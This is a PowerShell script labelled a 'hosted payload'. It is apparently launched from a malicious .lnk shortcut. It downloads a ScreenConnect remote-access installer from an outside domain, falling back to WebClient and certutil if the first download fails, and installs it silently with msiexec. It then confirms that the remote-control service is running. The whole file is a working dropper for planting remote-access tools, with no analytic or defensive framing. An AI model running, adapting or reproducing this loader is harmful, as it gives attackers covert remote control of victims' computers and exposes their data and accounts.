<#
    pay.ps1  -  hosted payload. Fetches the package, verifies it, installs it,
                and logs every step so a failure is never silent.

    Upload this file to
      https://raw.githubusercontent.com/paoladialcad-ship-it/file/refs/heads/main/pay.ps1

    Optional environment overrides (set before the .lnk is launched):
      PAY_URL       package URL
      PAY_HASH      expected SHA-256, install refuses on mismatch
      PAY_LOG_DIR   log directory (default C:\Temp)
      PAY_DEBUG=dry context only, no download / no install

    Exit codes: 0 ok | 2 download failed | 3 hash mismatch | 4 install failed
#>

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

# --------------------------------------------------------------------------
# logging - both targets, never throws
# --------------------------------------------------------------------------
$LogDir = $env:PAY_LOG_DIR
if (-not $LogDir) { $LogDir = 'C:\Temp' }
if (-not (Test-Path -LiteralPath $LogDir)) {
    New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
}
$LogPath    = Join-Path $LogDir 'Execution_Status.log'
$DesktopLog = Join-Path ([Environment]::GetFolderPath('Desktop')) 'Execution_Status.log'

function Write-Log {
    param([string]$Message)
    $entry = '[' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '] ' + $Message
    foreach ($p in @($LogPath, $DesktopLog)) {
        try { Add-Content -LiteralPath $p -Value $entry -Encoding UTF8 -ErrorAction Stop } catch { }
    }
    try { Write-Host $entry } catch { }
}

$T0 = Get-Date
if ($PSCommandPath) { Write-Log ('[*] payload start pid=' + $PID + ' src=' + $PSCommandPath) }
else { Write-Log ('[*] payload start pid=' + $PID + ' src=iex') }

# --------------------------------------------------------------------------
# config
# --------------------------------------------------------------------------
$Url = $env:PAY_URL
if (-not $Url) {
    $Url = 'https://cibiconline.co/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=mine&c=&c=&c=&c=&c=&c='
}
$ExpectHash = $env:PAY_HASH
$Dry        = ($env:PAY_DEBUG -eq 'dry')

$MsiPath = Join-Path $env:TEMP 'ScreenConnect.msi'
$MsiLog  = Join-Path $env:TEMP 'ScreenConnect_msi.log'

# --------------------------------------------------------------------------
# context
# --------------------------------------------------------------------------
try {
    $id  = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr  = New-Object Security.Principal.WindowsPrincipal -ArgumentList $id
    $bld = ''
    try { $bld = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion } catch { }
    Write-Log ('[*] ctx ps=' + $PSVersionTable.PSVersion + ' win=' + [Environment]::OSVersion.VersionString + ' build=' + $bld)
    Write-Log ('[*] ctx user=' + $id.Name + ' admin=' + $pr.IsInRole('Administrator') + ' lang=' + $ExecutionContext.SessionState.LanguageMode)
} catch { Write-Log ('[-] ctx failed: ' + $_.Exception.Message) }

if ($Dry) {
    Write-Log '[*] dry run - stopping before download'
    exit 0
}

# --------------------------------------------------------------------------
# download - three tiers, first success wins
# --------------------------------------------------------------------------
Write-Log ('[*] target ' + $Url)

function Get-FileTiered {
    param([string]$Address, [string]$OutFile)

    $tiers = @(
        @{ Name = 'iwr'; Act = {
            Invoke-WebRequest -Uri $Address -UseBasicParsing -OutFile $OutFile -TimeoutSec 120
        } },
        @{ Name = 'webclient'; Act = {
            $wc = New-Object Net.WebClient
            $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
            $wc.DownloadFile($Address, $OutFile)
        } },
        @{ Name = 'certutil'; Act = {
            $p = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\certutil.exe') `
                 -ArgumentList ('-urlcache -f -split "' + $Address + '" "' + $OutFile + '"') `
                 -PassThru -Wait -WindowStyle Hidden
            if ($p.ExitCode -ne 0 -or -not (Test-Path -LiteralPath $OutFile)) { throw ('certutil exit ' + $p.ExitCode) }
        } }
    )

    foreach ($t in $tiers) {
        $sw = [Diagnostics.Stopwatch]::StartNew()
        try {
            if (Test-Path -LiteralPath $OutFile) { Remove-Item -LiteralPath $OutFile -Force }
            & $t.Act
            $size = (Get-Item -LiteralPath $OutFile -ErrorAction Stop).Length
            if ($size -le 0) { throw 'downloaded file is empty' }
            Write-Log ('[+] download via ' + $t.Name + ' ok, ' + $size + ' bytes in ' + $sw.ElapsedMilliseconds + 'ms')
            return $true
        } catch {
            Write-Log ('[-] download via ' + $t.Name + ' failed after ' + $sw.ElapsedMilliseconds + 'ms: ' + $_.Exception.Message)
        }
    }
    return $false
}

try {
    $ok = Get-FileTiered -Address $Url -OutFile $MsiPath
} catch {
    Write-Log ('[-] download fatal: ' + $_.Exception.Message)
    $ok = $false
}
if (-not $ok) {
    Write-Log '[-] all download methods failed'
    exit 2
}

Write-Log ('[+] payload written to ' + $MsiPath)

# --------------------------------------------------------------------------
# integrity
# --------------------------------------------------------------------------
try {
    $hash = (Get-FileHash -LiteralPath $MsiPath -Algorithm SHA256).Hash
    Write-Log ('[*] sha256 ' + $hash)
    if ($ExpectHash -and ($hash -ne $ExpectHash.ToUpper())) {
        Write-Log ('[-] hash mismatch, expected ' + $ExpectHash.ToUpper())
        exit 3
    }
} catch { Write-Log ('[-] hash failed: ' + $_.Exception.Message) }

try { Unblock-File -LiteralPath $MsiPath -ErrorAction SilentlyContinue } catch { }

# --------------------------------------------------------------------------
# install
# --------------------------------------------------------------------------
$MsiArgs = '/i "' + $MsiPath + '" /qn /norestart /l*v "' + $MsiLog + '"'
Write-Log ('[*] exec msiexec ' + $MsiArgs)
$iw = [Diagnostics.Stopwatch]::StartNew()
try {
    $proc = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\msiexec.exe') `
              -ArgumentList $MsiArgs -PassThru -Wait
    $map = @{ 0 = 'success'; 1602 = 'user cancel'; 1603 = 'fatal, usually needs elevation';
              1619 = 'cannot open package'; 1625 = 'blocked by policy'; 1633 = 'unsupported platform';
              1638 = 'already installed'; 3010 = 'reboot required' }
    $why = $map[$proc.ExitCode]
    if (-not $why) { $why = 'unmapped' }
    Write-Log ('[+] msiexec exit=' + $proc.ExitCode + ' (' + $why + ') in ' + $iw.ElapsedMilliseconds + 'ms, log ' + $MsiLog)
    if ($proc.ExitCode -ne 0 -and $proc.ExitCode -ne 3010) { exit 4 }
} catch {
    Write-Log ('[-] install failed: ' + $_.Exception.Message)
    exit 4
}

# --------------------------------------------------------------------------
# verify
# --------------------------------------------------------------------------
try {
    $keys = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    Get-ItemProperty $keys -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName -match 'ScreenConnect|ConnectWise' } |
        ForEach-Object { Write-Log ('[+] installed: ' + $_.DisplayName + ' ' + $_.DisplayVersion) }
} catch { }

try {
    Get-Service -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match 'ScreenConnect' } |
        ForEach-Object { Write-Log ('[+] service ' + $_.Name + ' ' + $_.Status) }
} catch { }

try {
    Get-Process -ErrorAction SilentlyContinue |
        Where-Object { $_.ProcessName -match 'ScreenConnect' } |
        ForEach-Object { Write-Log ('[+] process ' + $_.ProcessName + ' pid=' + $_.Id) }
} catch { }

Write-Log ('[*] payload done in ' + [int]((Get-Date) - $T0).TotalMilliseconds + 'ms')
exit 0
